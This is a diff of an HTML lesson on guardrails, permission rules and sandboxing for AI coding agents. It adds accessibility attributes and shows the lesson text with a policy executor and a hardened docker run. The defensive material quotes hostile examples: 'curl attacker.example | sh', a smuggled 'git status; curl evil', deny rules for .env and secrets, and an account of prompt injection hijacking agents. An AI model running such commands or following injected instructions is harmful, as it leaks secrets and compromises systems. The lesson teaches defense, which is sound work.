@@ -124,7 +124,7 @@
   </div>
 </aside>
 <main id="main" class="lesson" data-slug="guardrails-and-sandboxing">
-  <nav class="breadcrumb"><a href="curriculum.html">Curriculum</a><span>›</span><a href="curriculum.html#safety">Module 7: Safety &amp; Security</a></nav>
+  <nav class="breadcrumb" aria-label="Breadcrumb"><a href="curriculum.html">Curriculum</a><span>›</span><a href="curriculum.html#safety">Module 7: Safety &amp; Security</a></nav>
   <header class="lesson-header">
     <h1>Guardrails, Permissions &amp; Sandboxing</h1>
     <p class="lead">Defense in depth for agents: input and output guardrails, permission systems and policy engines, hooks and spend caps, and sandboxes from containers to microVMs.</p>
@@ -145,7 +145,7 @@
 <p>In <a href="agent-security.html">Agent Security &amp; Prompt Injection</a> we reached an uncomfortable conclusion: you cannot make a language model reliably refuse every malicious instruction it reads. So what <em>do</em> you do? You do what security engineers have always done with components they can&#39;t fully trust: you surround them with <strong>controls that don&#39;t depend on the component behaving well</strong>.</p>
 <p>A <dfn class="gt" tabindex="0" data-t="Coding agent" data-d="An agent that reads, writes and runs code in a repository, using tools such as file editing, search, a shell and tests to complete software tasks." data-l="coding-agents" data-a="coding-agent">coding agent</dfn> that can run shell commands is, from a security standpoint, <em>remote code execution as a service</em>. That&#39;s not a criticism — it&#39;s exactly what makes it useful. The engineering question is how to let it run <code>pytest</code> and <code>npm install</code> a thousand times a day while ensuring that the one time it&#39;s tricked into running <code>curl attacker.example | sh</code>, nothing bad happens: no secrets leak, no production system is touched, nothing persists.</p>
 <p>This lesson is the practical toolkit: <strong><dfn class="gt" tabindex="0" data-t="Guardrail" data-d="A check that runs alongside or around the model, such as input or output classifiers, policy rules or schema validation, to block unsafe, off-topic or malformed behavior." data-a="guardrail">guardrails</dfn></strong> that screen what goes in and comes out, <strong>permission systems</strong> that decide which actions run, and <strong>sandboxes</strong> that contain whatever runs anyway. Along the way we&#39;ll build a policy-checked tool executor in Python and a hardened <code>docker run</code> invocation you can adapt.</p>
-<h2 id="defense-in-depth"><a class="anchor" href="#defense-in-depth" aria-hidden="true">#</a>Defense in Depth</h2>
+<h2 id="defense-in-depth"><a class="anchor" href="#defense-in-depth" aria-hidden="true" tabindex="-1">#</a>Defense in Depth</h2>
 <p><strong>Defense in depth</strong> means stacking independent layers so that an attack must defeat <em>all</em> of them. It&#39;s often pictured as the &quot;Swiss cheese model&quot;: each slice has holes, but holes rarely line up.</p>
 <p>For agents, the layers are:</p>
 <div class="table-wrap"><table>
@@ -207,9 +207,9 @@
   AG -.-&gt; L[&quot;Audit log&quot;]
   SB -.-&gt; L</pre></figure>
 <p>Notice the &quot;Nature&quot; column. The upper layers are <strong>probabilistic</strong>: classifiers and models with error rates. The lower layers are <strong>deterministic</strong>: a container with no network route cannot exfiltrate over the network no matter how persuasive the injected prompt. A good design puts your hardest guarantees in the deterministic layers and uses probabilistic layers to reduce noise and catch problems early.</p>
-<aside class="callout callout-key"><div class="callout-title"><span class="callout-icon" aria-hidden="true">🔑</span>Put guarantees where the model can&#39;t argue with them</div><div class="callout-body"><p>A guardrail that is itself an LLM can be manipulated by the same text it&#39;s inspecting. A Linux namespace, a network policy or a permission rule evaluated in plain code cannot. Use probabilistic guardrails to reduce how often bad things are <em>attempted</em>; use deterministic controls to bound what happens when they are.</p>
-</div></aside>
-<h2 id="input-guardrails"><a class="anchor" href="#input-guardrails" aria-hidden="true">#</a>Input Guardrails</h2>
+<div class="callout callout-key" role="note"><div class="callout-title"><span class="callout-icon" aria-hidden="true">🔑</span>Put guarantees where the model can&#39;t argue with them</div><div class="callout-body"><p>A guardrail that is itself an LLM can be manipulated by the same text it&#39;s inspecting. A Linux namespace, a network policy or a permission rule evaluated in plain code cannot. Use probabilistic guardrails to reduce how often bad things are <em>attempted</em>; use deterministic controls to bound what happens when they are.</p>
+</div></div>
+<h2 id="input-guardrails"><a class="anchor" href="#input-guardrails" aria-hidden="true" tabindex="-1">#</a>Input Guardrails</h2>
 <p><strong>Input guardrails</strong> inspect content <em>before</em> the model acts on it. That includes the user&#39;s message and, crucially for agents, tool results and retrieved documents.</p>
 <ul>
 <li><strong>Content moderation</strong>: classify inputs against harm categories (violence, sexual content involving minors, self-harm, etc.). Most providers offer moderation endpoints or built-in safety systems; many apps add their own.</li>
@@ -217,16 +217,16 @@
 <li><strong>PII detection</strong>: find names, emails, phone numbers, card numbers or health data, then mask, tokenize or block them before they reach a third-party model or a log. Tools range from regex plus checksum validation (Luhn for card numbers) to NER-based libraries like Microsoft Presidio.</li>
 <li><strong>Topic scoping</strong>: keep a narrow agent on task. A banking support agent can decline requests to write poetry or discuss competitors. Implement with a cheap classifier or a fast model call returning an enum.</li>
 </ul>
-<h3 id="placement-and-latency"><a class="anchor" href="#placement-and-latency" aria-hidden="true">#</a>Placement and latency</h3>
+<h3 id="placement-and-latency"><a class="anchor" href="#placement-and-latency" aria-hidden="true" tabindex="-1">#</a>Placement and latency</h3>
 <p>Every guardrail adds latency and cost. Common tactics:</p>
 <ul>
 <li><strong>Run in parallel</strong> with the main model call and cancel the response if the guardrail trips. The OpenAI Agents SDK, for example, models this as guardrails with a &quot;tripwire&quot; that halts the run.</li>
 <li><strong>Tier your checks</strong>: regex and allowlists first (microseconds), small classifiers next (milliseconds), LLM judges only for ambiguous cases.</li>
 <li><strong>Fail closed for high-stakes paths</strong> (if the injection classifier is down, don&#39;t let browsing results reach an agent with payment tools) and <strong>fail open for low-stakes ones</strong> (a topic classifier outage shouldn&#39;t break a FAQ bot).</li>
 </ul>
-<aside class="callout callout-warning"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Classifier scores are not verdicts</div><div class="callout-body"><p>An injection classifier with a 1% false-negative rate still lets through one in a hundred attacks, and attackers get unlimited tries. It will also flag legitimate content — a security wiki page <em>about</em> <dfn class="gt" tabindex="0" data-t="Prompt injection" data-d="An attack in which text crafted by an attacker is interpreted by the model as instructions, overriding the developer's or user's intent." data-l="agent-security" data-a="prompt-injection">prompt injection</dfn> looks a lot like an attack. Route detections to logging, quarantine or human confirmation, and tune thresholds on your own traffic.</p>
-</div></aside>
-<h2 id="output-guardrails"><a class="anchor" href="#output-guardrails" aria-hidden="true">#</a>Output Guardrails</h2>
+<div class="callout callout-warning" role="note"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Classifier scores are not verdicts</div><div class="callout-body"><p>An injection classifier with a 1% false-negative rate still lets through one in a hundred attacks, and attackers get unlimited tries. It will also flag legitimate content — a security wiki page <em>about</em> <dfn class="gt" tabindex="0" data-t="Prompt injection" data-d="An attack in which text crafted by an attacker is interpreted by the model as instructions, overriding the developer's or user's intent." data-l="agent-security" data-a="prompt-injection">prompt injection</dfn> looks a lot like an attack. Route detections to logging, quarantine or human confirmation, and tune thresholds on your own traffic.</p>
+</div></div>
+<h2 id="output-guardrails"><a class="anchor" href="#output-guardrails" aria-hidden="true" tabindex="-1">#</a>Output Guardrails</h2>
 <p><strong>Output guardrails</strong> inspect what the model produces before it reaches a user, a downstream system or a tool.</p>
 <ul>
 <li><strong>Policy checks</strong>: does the response violate content policy, make commitments the business can&#39;t honor (&quot;I&#39;ve approved your refund&quot; when it can&#39;t), or give regulated advice? Often a classifier or a rubric-graded <dfn class="gt" tabindex="0" data-t="LLM-as-a-judge" data-d="Using a language model with a rubric to grade outputs that lack a simple programmatic check. Judges must be validated against human labels and watched for biases." data-l="evaluating-agents" data-a="llm-as-a-judge">LLM judge</dfn>.</li>
@@ -235,7 +235,7 @@
 <li><strong>Schema validation</strong>: every tool call and structured output is validated against a schema <em>in code</em>, regardless of whether the model was constrained. Reject or repair invalid output rather than passing it on. <a href="structured-outputs.html">Structured Outputs</a> covers <dfn class="gt" tabindex="0" data-t="Constrained decoding" data-d="Enforcing a grammar or schema at generation time by masking tokens that would violate it, guaranteeing syntactically valid structured output." data-l="structured-outputs" data-a="constrained-decoding">constrained decoding</dfn>, which makes this cheap.</li>
 <li><strong>Safe rendering</strong>: escape HTML, neutralize markdown images and links to unknown domains, and never <code>eval</code> model output. This is OWASP&#39;s &quot;Improper Output Handling.&quot;</li>
 </ul>
-<h2 id="the-guardrail-toolbox"><a class="anchor" href="#the-guardrail-toolbox" aria-hidden="true">#</a>The Guardrail Toolbox</h2>
+<h2 id="the-guardrail-toolbox"><a class="anchor" href="#the-guardrail-toolbox" aria-hidden="true" tabindex="-1">#</a>The Guardrail Toolbox</h2>
 <p>You rarely need to build classifiers from scratch. As of 2026, the common building blocks are:</p>
 <div class="table-wrap"><table>
 <thead>
@@ -278,9 +278,9 @@
 </tbody></table>
 </div>
 <p>These evolve quickly; check current documentation for model versions and categories. The design principles are stable: know what each tool detects, measure its precision and recall on your data, and treat it as one layer.</p>
-<h2 id="action-level-guardrails"><a class="anchor" href="#action-level-guardrails" aria-hidden="true">#</a>Action-Level Guardrails</h2>
+<h2 id="action-level-guardrails"><a class="anchor" href="#action-level-guardrails" aria-hidden="true" tabindex="-1">#</a>Action-Level Guardrails</h2>
 <p>This is where agent security diverges most from chatbot safety. The most important question isn&#39;t &quot;is this text harmful?&quot; but &quot;<strong>should this tool call with these arguments run right now?</strong>&quot;</p>
-<h3 id="permission-systems-allow-ask-deny"><a class="anchor" href="#permission-systems-allow-ask-deny" aria-hidden="true">#</a>Permission systems: allow, ask, deny</h3>
+<h3 id="permission-systems-allow-ask-deny"><a class="anchor" href="#permission-systems-allow-ask-deny" aria-hidden="true" tabindex="-1">#</a>Permission systems: allow, ask, deny</h3>
 <p>A <strong>permission system</strong> maps each proposed tool call to one of three outcomes:</p>
 <ul>
 <li><strong>Allow</strong>: run without asking (read a file in the workspace, run the test suite).</li>
@@ -288,7 +288,7 @@
 <li><strong>Deny</strong>: never run, and tell the model it was blocked (read <code>.env</code>, <code>rm -rf</code>, access the cloud metadata endpoint).</li>
 </ul>
 <p>Rules match on the tool name and its arguments, usually with <strong>glob patterns</strong>. Claude Code, for example, configures this in <code>settings.json</code> with rule lists like the following (syntax as of 2026; check current docs):</p>
-<div class="code-block"><div class="code-head"><span class="code-lang">json</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+<div class="code-block"><div class="code-head"><span class="code-lang">json</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre tabindex="0"><code class="hljs language-json"><span class="hljs-punctuation">{</span>
   <span class="hljs-attr">&quot;permissions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
     <span class="hljs-attr">&quot;allow&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;Bash(npm run test *)&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Read(./src/**)&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
     <span class="hljs-attr">&quot;ask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;Bash(git push *)&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;WebFetch&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
@@ -296,9 +296,9 @@
   <span class="hljs-punctuation">}</span>
 <span class="hljs-punctuation">}</span></code></pre></div>
 <p>(A trailing <code> *</code> is a prefix wildcard; older configs write the same thing as <code>:*</code>, e.g. <code>Bash(git push:*)</code>.) Two precedence principles matter. First, <strong>deny beats ask beats allow</strong>, regardless of how specific each rule is — an allow can never carve an exception out of a deny. Second, <strong>unmatched means ask (or deny)</strong>, never allow. Secure defaults are the whole point.</p>
-<h3 id="a-policy-checked-tool-executor"><a class="anchor" href="#a-policy-checked-tool-executor" aria-hidden="true">#</a>A policy-checked tool executor</h3>
+<h3 id="a-policy-checked-tool-executor"><a class="anchor" href="#a-policy-checked-tool-executor" aria-hidden="true" tabindex="-1">#</a>A policy-checked tool executor</h3>
 <p>Here is a self-contained executor implementing those semantics, plus the two subtleties that trip up real systems: <strong>argument canonicalization</strong> (so <code>../../.env</code> can&#39;t sneak past a rule for <code>.env</code>) and <strong>shell metacharacters</strong> (so <code>git status; curl evil</code> can&#39;t match an allow rule for <code>git status*</code>). Every decision goes to a hash-chained, append-only audit log.</p>
-<div class="code-block"><div class="code-head"><span class="code-lang">python</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-python"><span class="hljs-keyword">import</span> fnmatch, hashlib, json, os, shlex, time
+<div class="code-block"><div class="code-head"><span class="code-lang">python</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre tabindex="0"><code class="hljs language-python"><span class="hljs-keyword">import</span> fnmatch, hashlib, json, os, shlex, time
 <span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass
 <span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span>, <span class="hljs-type">Callable</span>, <span class="hljs-type">Literal</span>
 
@@ -362,7 +362,7 @@ SHELL_META = <span class="hljs-built_in">set</span>(<span class="hljs-string">&q
         <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    <span class="hljs-comment"># tool failures go back to the model</span>
             <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>: <span class="hljs-subst">{e}</span>&quot;</span>, <span class="hljs-string">&quot;is_error&quot;</span>: <span class="hljs-literal">True</span>}</code></pre></div>
 <p>Wiring it into a manual <dfn class="gt" tabindex="0" data-t="Agent loop" data-d="The core cycle of an agent: call the model, execute any tools it requests, feed the results back, and repeat until the model produces a final answer or a stopping condition (step, time or cost budget) is hit." data-l="the-agent-loop" data-a="agent-loop">agent loop</dfn> (see <a href="tool-use.html">Tool Use</a>) is one line per tool call — the returned dict becomes a <code>tool_result</code> block:</p>
-<div class="code-block"><div class="code-head"><span class="code-lang">python</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-python">rules = [
+<div class="code-block"><div class="code-head"><span class="code-lang">python</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre tabindex="0"><code class="hljs language-python">rules = [
     Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*/.env*&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>),
     Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*/secrets/*&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>),
     Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;allow&quot;</span>),           <span class="hljs-comment"># in-workspace reads are fine (outside forces ask)</span>
@@ -378,13 +378,13 @@ executor = PolicyExecutor(rules, tools={<span class="hljs-string">&quot;read_fil
 result = executor.run(block.name, block.<span class="hljs-built_in">input</span>)
 tool_results.append({<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;tool_result&quot;</span>, <span class="hljs-string">&quot;tool_use_id&quot;</span>: block.<span class="hljs-built_in">id</span>, **result})</code></pre></div>
 <p>Returning a denial as an <code>is_error</code> result (rather than crashing) matters: the model learns the action was blocked and can choose another approach or explain to the user.</p>
-<aside class="callout callout-warning"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Command-string rules are a weak boundary</div><div class="callout-body"><p>Pattern-matching shell strings is inherently leaky. <code>python -c &quot;...&quot;</code>, <code>npm test</code> running an attacker-modified <code>package.json</code>, or <code>git</code> with a malicious config hook can all do arbitrary things while matching an &quot;allowed&quot; prefix. Permission rules reduce risk and prompts; the <strong>sandbox</strong> is what actually contains a command once it runs.</p>
-</div></aside>
-<h3 id="policy-engines"><a class="anchor" href="#policy-engines" aria-hidden="true">#</a>Policy engines</h3>
+<div class="callout callout-warning" role="note"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Command-string rules are a weak boundary</div><div class="callout-body"><p>Pattern-matching shell strings is inherently leaky. <code>python -c &quot;...&quot;</code>, <code>npm test</code> running an attacker-modified <code>package.json</code>, or <code>git</code> with a malicious config hook can all do arbitrary things while matching an &quot;allowed&quot; prefix. Permission rules reduce risk and prompts; the <strong>sandbox</strong> is what actually contains a command once it runs.</p>
+</div></div>
+<h3 id="policy-engines"><a class="anchor" href="#policy-engines" aria-hidden="true" tabindex="-1">#</a>Policy engines</h3>
 <p>As rules grow, move them out of application code into a <strong>policy engine</strong> — a dedicated evaluator for declarative policies such as <strong>Open Policy Agent</strong> (Rego language) or <strong>Cedar</strong> (AWS&#39;s open-source policy language). Benefits: policies are versioned and reviewed like code, tested independently, shared across services, and can use rich context (user role, time of day, data classification, how many refunds this session has issued). CaMeL-style information-flow policies from the <a href="agent-security.html">security lesson</a> are a more powerful version of the same idea.</p>
-<h3 id="hooks"><a class="anchor" href="#hooks" aria-hidden="true">#</a>Hooks</h3>
+<h3 id="hooks"><a class="anchor" href="#hooks" aria-hidden="true" tabindex="-1">#</a>Hooks</h3>
 <p><strong>Hooks</strong> are user-defined code that runs at lifecycle points in the agent loop. In Claude Code, for instance, a <code>PreToolUse</code> hook receives the proposed tool call as JSON and can block it (by exiting with code 2, with stderr fed back to the model), and a <code>PostToolUse</code> hook can inspect results — say, scanning a fetched web page for injection patterns, or running a linter after every file edit. The <dfn class="gt" tabindex="0" data-t="Claude Agent SDK" data-d="A Python and TypeScript library that packages the harness behind Claude Code (agent loop, built-in tools, context compaction, sessions, hooks, subagents and permission modes) for building your own agents." data-l="sdk-hands-on" data-a="claude-agent-sdk">Claude Agent SDK</dfn> and other frameworks expose similar callbacks. Hooks let teams enforce organization-specific policy without modifying the agent itself.</p>
-<h3 id="rate-limits-and-spend-caps"><a class="anchor" href="#rate-limits-and-spend-caps" aria-hidden="true">#</a>Rate limits and spend caps</h3>
+<h3 id="rate-limits-and-spend-caps"><a class="anchor" href="#rate-limits-and-spend-caps" aria-hidden="true" tabindex="-1">#</a>Rate limits and spend caps</h3>
 <p>Some harms come from <em>volume</em>, not any single action:</p>
 <ul>
 <li><strong>Rate limits per tool</strong>: at most N emails per hour, M API writes per minute. Bounds damage from a hijacked or looping agent.</li>
@@ -393,9 +393,9 @@ tool_results.append({<span class="hljs-string">&quot;type&quot;</span>: <span cl
 <li><strong>Step and time limits</strong>: maximum agent iterations and wall-clock time, enforced by the harness (see <a href="reliability.html">Reliability</a>).</li>
 <li><strong>Circuit breakers</strong>: if error rates or denial rates spike, pause the agent and alert a human.</li>
 </ul>
-<h2 id="sandboxing"><a class="anchor" href="#sandboxing" aria-hidden="true">#</a>Sandboxing</h2>
+<h2 id="sandboxing"><a class="anchor" href="#sandboxing" aria-hidden="true" tabindex="-1">#</a>Sandboxing</h2>
 <p>A <strong>sandbox</strong> is an execution environment that restricts what code running inside it can access. For agents that execute code or shell commands, the sandbox is the last and most important deterministic layer: it defines the blast radius when everything above it fails.</p>
-<h3 id="the-isolation-spectrum"><a class="anchor" href="#the-isolation-spectrum" aria-hidden="true">#</a>The isolation spectrum</h3>
+<h3 id="the-isolation-spectrum"><a class="anchor" href="#the-isolation-spectrum" aria-hidden="true" tabindex="-1">#</a>The isolation spectrum</h3>
 <div class="table-wrap"><table>
 <thead>
 <tr>
@@ -445,18 +445,18 @@ tool_results.append({<span class="hljs-string">&quot;type&quot;</span>: <span cl
 </div>
 <p>The key distinction is the <strong>kernel boundary</strong>. A standard container shares the host kernel, so a kernel vulnerability can become a container escape. gVisor puts a second, memory-safe kernel implementation in between; microVMs give each workload its own guest kernel behind a hypervisor. Firecracker was built by AWS to run Lambda and Fargate workloads, and several hosted agent-sandbox services build on microVMs for exactly this reason.</p>
 <p>Local coding agents increasingly use lightweight OS-level sandboxing. Claude Code&#39;s sandbox mode, for instance, uses bubblewrap on Linux and Seatbelt on macOS to restrict filesystem writes to the project directory and route network traffic through a proxy that enforces a domain allowlist — letting the agent run more commands without permission prompts because the sandbox, not the prompt, bounds the risk.</p>
-<aside class="callout callout-tip"><div class="callout-title"><span class="callout-icon" aria-hidden="true">💡</span>Rule of thumb</div><div class="callout-body"><p>If the code is <em>your</em> code run by <em>your</em> agent on <em>your</em> laptop, OS-level sandboxing or a hardened container is usually proportionate. If you run code influenced by untrusted users or content, in a multi-tenant service, use gVisor or microVMs.</p>
-</div></aside>
-<h3 id="filesystem-scoping"><a class="anchor" href="#filesystem-scoping" aria-hidden="true">#</a>Filesystem scoping</h3>
+<div class="callout callout-tip" role="note"><div class="callout-title"><span class="callout-icon" aria-hidden="true">💡</span>Rule of thumb</div><div class="callout-body"><p>If the code is <em>your</em> code run by <em>your</em> agent on <em>your</em> laptop, OS-level sandboxing or a hardened container is usually proportionate. If you run code influenced by untrusted users or content, in a multi-tenant service, use gVisor or microVMs.</p>
+</div></div>
+<h3 id="filesystem-scoping"><a class="anchor" href="#filesystem-scoping" aria-hidden="true" tabindex="-1">#</a>Filesystem scoping</h3>
 <ul>
 <li>Mount <strong>only</strong> the working directory the task needs, never the home directory or <code>/</code>.</li>
 <li>Mount reference data <strong>read-only</strong>. Make the container&#39;s root filesystem read-only and give it a small <code>tmpfs</code> for scratch space.</li>
 <li>Keep secrets out of the filesystem entirely: no <code>.env</code>, no <code>~/.aws</code>, no <code>~/.ssh</code>, no Docker socket (mounting <code>/var/run/docker.sock</code> is equivalent to giving root on the host).</li>
 <li>Canonicalize paths in your tools (as in the executor above) so symlinks and <code>..</code> can&#39;t escape the scope.</li>
 </ul>
-<h3 id="network-egress-allowlists"><a class="anchor" href="#network-egress-allowlists" aria-hidden="true">#</a>Network egress allowlists</h3>
+<h3 id="network-egress-allowlists"><a class="anchor" href="#network-egress-allowlists" aria-hidden="true" tabindex="-1">#</a>Network egress allowlists</h3>
 <p>Default to <strong>no network</strong>. When the task needs it, route all traffic through an <strong>egress proxy</strong> that allows specific domains (your package registry, <code>api.github.com</code>) and blocks everything else — including the <strong>cloud metadata endpoint</strong> (<code>169.254.169.254</code>), a classic way to steal cloud credentials from inside a VM. Allowlist by domain at an HTTP(S) proxy; avoid &quot;allow all of <code>*.amazonaws.com</code>,&quot; since attackers can host content on broad shared domains too.</p>
-<h3 id="credential-isolation-via-proxies"><a class="anchor" href="#credential-isolation-via-proxies" aria-hidden="true">#</a>Credential isolation via proxies</h3>
+<h3 id="credential-isolation-via-proxies"><a class="anchor" href="#credential-isolation-via-proxies" aria-hidden="true" tabindex="-1">#</a>Credential isolation via proxies</h3>
 <p>The most elegant pattern: <strong>the agent never holds real secrets.</strong> Requests leave the sandbox without credentials; a proxy outside the sandbox recognizes the destination and injects the right token.</p>
 <figure class="diagram"><pre class="mermaid">sequenceDiagram
   participant Ag as Agent (sandbox)
@@ -470,13 +470,13 @@ tool_results.append({<span class="hljs-string">&quot;type&quot;</span>: <span cl
   API--&gt;&gt;Px: 200 OK
   Px--&gt;&gt;Ag: 200 OK (token never visible)</pre></figure>
 <p>Even a fully compromised agent cannot print, log or exfiltrate a token it never sees. The proxy is also the natural place to enforce per-host method restrictions (GET only), rate limits and logging. Combine with short-lived, narrowly scoped credentials (OAuth scopes, fine-grained tokens, per-task identities) so that even a leaked token is low-value.</p>
-<h3 id="resource-and-time-limits"><a class="anchor" href="#resource-and-time-limits" aria-hidden="true">#</a>Resource and time limits</h3>
+<h3 id="resource-and-time-limits"><a class="anchor" href="#resource-and-time-limits" aria-hidden="true" tabindex="-1">#</a>Resource and time limits</h3>
 <p>Cap CPU, memory, process count (fork bombs), disk, open files and wall-clock time. A runaway <code>while True</code> or a crypto miner should hit a wall, not your cloud bill. Enforce the timeout <strong>outside</strong> the sandbox so the code inside can&#39;t disable it.</p>
-<h3 id="ephemeral-environments"><a class="anchor" href="#ephemeral-environments" aria-hidden="true">#</a>Ephemeral environments</h3>
+<h3 id="ephemeral-environments"><a class="anchor" href="#ephemeral-environments" aria-hidden="true" tabindex="-1">#</a>Ephemeral environments</h3>
 <p>Create a fresh sandbox per task (or per session) and destroy it afterward. <strong>Ephemerality</strong> prevents persistence — malware or a poisoned config file left behind can&#39;t affect the next run — and makes behavior reproducible. Snapshot images let you start in seconds with dependencies preinstalled. Persist only explicit outputs (a diff, an artifact) and review them before they flow anywhere important.</p>
-<h3 id="a-hardened-docker-run"><a class="anchor" href="#a-hardened-docker-run" aria-hidden="true">#</a>A hardened <code>docker run</code></h3>
+<h3 id="a-hardened-docker-run"><a class="anchor" href="#a-hardened-docker-run" aria-hidden="true" tabindex="-1">#</a>A hardened <code>docker run</code></h3>
 <p>Putting the pieces together for a container-based code sandbox:</p>
-<div class="code-block"><div class="code-head"><span class="code-lang">bash</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-bash"><span class="hljs-comment"># Ephemeral, unprivileged, read-only container with no network and hard resource limits.</span>
+<div class="code-block"><div class="code-head"><span class="code-lang">bash</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre tabindex="0"><code class="hljs language-bash"><span class="hljs-comment"># Ephemeral, unprivileged, read-only container with no network and hard resource limits.</span>
 <span class="hljs-comment"># --runtime=runsc requires gVisor to be installed; drop that line to use plain runc.</span>
 docker run --<span class="hljs-built_in">rm</span> \
   --runtime=runsc \
@@ -509,7 +509,7 @@ docker run --<span class="hljs-built_in">rm</span> \
 <li><code>timeout</code>: a wall-clock limit. For a stronger guarantee, also enforce a deadline from the orchestrator that runs <code>docker kill</code>.</li>
 </ul>
 <p>When the task needs network access, replace <code>--network none</code> with a network created by <code>docker network create --internal agent-net</code> (no route to the outside), attach an egress-proxy container to both that network and the outside, and set <code>HTTPS_PROXY</code> in the sandbox to point at the proxy. The proxy then enforces the domain allowlist and injects credentials.</p>
-<h2 id="secure-by-default-configuration"><a class="anchor" href="#secure-by-default-configuration" aria-hidden="true">#</a>Secure-by-Default Configuration</h2>
+<h2 id="secure-by-default-configuration"><a class="anchor" href="#secure-by-default-configuration" aria-hidden="true" tabindex="-1">#</a>Secure-by-Default Configuration</h2>
 <p>Most real incidents come from configuration, not exotic exploits. Make the safe path the default path:</p>
 <ul>
 <li><strong>Unmatched actions ask or deny.</strong> Never ship a default-allow policy.</li>
@@ -520,7 +520,7 @@ docker run --<span class="hljs-built_in">rm</span> \
 <li><strong>Pin and verify dependencies</strong>: model versions, <dfn class="gt" tabindex="0" data-t="MCP server" data-d="A program that exposes tools, resources and prompts over the Model Context Protocol, for example wrapping a database, a SaaS API or the local filesystem." data-l="protocols-mcp-a2a" data-a="mcp-server">MCP server</dfn> versions, container image digests, package lockfiles.</li>
 <li><strong>Separate environments</strong>: agents operate on dev/staging data and propose changes to production through reviewed channels (pull requests, change tickets), not direct writes. See <a href="deployment.html">Deployment</a>.</li>
 </ul>
-<h2 id="auditing"><a class="anchor" href="#auditing" aria-hidden="true">#</a>Auditing</h2>
+<h2 id="auditing"><a class="anchor" href="#auditing" aria-hidden="true" tabindex="-1">#</a>Auditing</h2>
 <p>An <strong>audit trail</strong> answers, after the fact: <em>what did the agent do, why, on whose behalf, and with what authority?</em> Useful audit records include:</p>
 <ul>
 <li>Session ID, the human principal, the agent identity and version, model ID.</li>
@@ -529,7 +529,7 @@ docker run --<span class="hljs-built_in">rm</span> \
 <li>Results (or hashes of large results) and errors.</li>
 </ul>
 <p>Make logs <strong>append-only and tamper-evident</strong> (hash chaining as in the executor, or write-once storage), store them <strong>outside the sandbox</strong> where the agent can&#39;t edit them, and <strong>redact secrets</strong> before writing. Review them: periodic sampling, alerts on denied-action spikes, and post-incident replay. Audit trails are also the foundation for accountability and compliance, discussed in <a href="agent-safety-alignment.html">Safety, Alignment &amp; Governance</a>. <a href="observability.html">Observability</a> covers the tracing infrastructure.</p>
-<h2 id="the-safetyusefulness-trade-off"><a class="anchor" href="#the-safetyusefulness-trade-off" aria-hidden="true">#</a>The Safety–Usefulness Trade-off</h2>
+<h2 id="the-safetyusefulness-trade-off"><a class="anchor" href="#the-safetyusefulness-trade-off" aria-hidden="true" tabindex="-1">#</a>The Safety–Usefulness Trade-off</h2>
 <p>Every control has a cost. A permission prompt for every file read makes an agent safe and useless. A fully autonomous agent with your credentials is maximally useful until the day it isn&#39;t. The goal is not maximum restriction but <strong>proportionate</strong> restriction.</p>
 <p>Practical guidance:</p>
 <ul>
@@ -547,9 +547,9 @@ docker run --<span class="hljs-built_in">rm</span> \
   D --&gt;|no| F{&quot;Destructive or touches secrets?&quot;}
   F --&gt;|yes| G[&quot;Deny&quot;]
   F --&gt;|no| E</pre></figure>
-<aside class="callout callout-example"><div class="callout-title"><span class="callout-icon" aria-hidden="true">🧪</span>A coding agent, layered</div><div class="callout-body"><p>Model trained with an instruction hierarchy. Fetched web pages pass an injection classifier; hits are flagged in context and logged. Edits and test runs inside the project directory are auto-allowed; <code>git push</code> asks; reading <code>.env</code> is denied; a <code>PreToolUse</code> hook blocks commands touching production hostnames. Everything runs in an ephemeral gVisor container with the repo mounted, network limited to the package registry and GitHub via a credential-injecting proxy, a 2 GB memory cap and a 30-minute timeout. Every call lands in an append-only log. An injection that hijacks the model can, at worst, write bad code to a branch that a human reviews.</p>
-</div></aside>
-<h2 id="key-takeaways"><a class="anchor" href="#key-takeaways" aria-hidden="true">#</a>Key Takeaways</h2>
